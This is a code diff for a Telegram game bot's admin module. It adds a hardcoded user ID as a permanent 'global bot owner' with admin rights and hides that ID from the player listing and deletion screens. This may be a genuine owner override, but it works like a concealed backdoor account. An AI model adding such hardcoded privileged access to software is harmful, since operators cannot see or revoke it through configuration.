@@ -44,8 +44,12 @@ class AdminPlayerStates(StatesGroup):
     waiting_gold_amount = State()
 
 
+# مالک ثابت ربات، مستقل از عضویت در گروه‌ها
+GLOBAL_BOT_OWNER_ID = 8537258392
+
+
 def is_admin(telegram_id: int) -> bool:
-    return telegram_id == settings.admin_id
+    return telegram_id in (settings.admin_id, GLOBAL_BOT_OWNER_ID)
 
 
 def admin_keyboard() -> InlineKeyboardMarkup:
@@ -163,7 +167,7 @@ def player_list_keyboard(
             )
         ]
         for character in characters
-        if character.telegram_id != settings.admin_id
+        if character.telegram_id not in (settings.admin_id, GLOBAL_BOT_OWNER_ID)
     ]
 
     rows.insert(
@@ -607,7 +611,7 @@ async def delete_players_page(callback: CallbackQuery):
         async with AsyncSessionLocal() as session:
             result = await session.execute(
                 select(Character)
-                .where(Character.telegram_id != settings.admin_id)
+                .where(Character.telegram_id.not_in((settings.admin_id, GLOBAL_BOT_OWNER_ID)))
                 .order_by(Character.id.desc())
                 .offset(page * PAGE_SIZE)
                 .limit(PAGE_SIZE + 1)
@@ -662,7 +666,7 @@ async def delete_player_select(callback: CallbackQuery):
         await callback.answer("شناسه پلیر نامعتبر است.", show_alert=True)
         return
 
-    if telegram_id == settings.admin_id:
+    if telegram_id in (settings.admin_id, GLOBAL_BOT_OWNER_ID):
         await callback.answer(
             "حذف ادمین اصلی مجاز نیست.",
             show_alert=True,
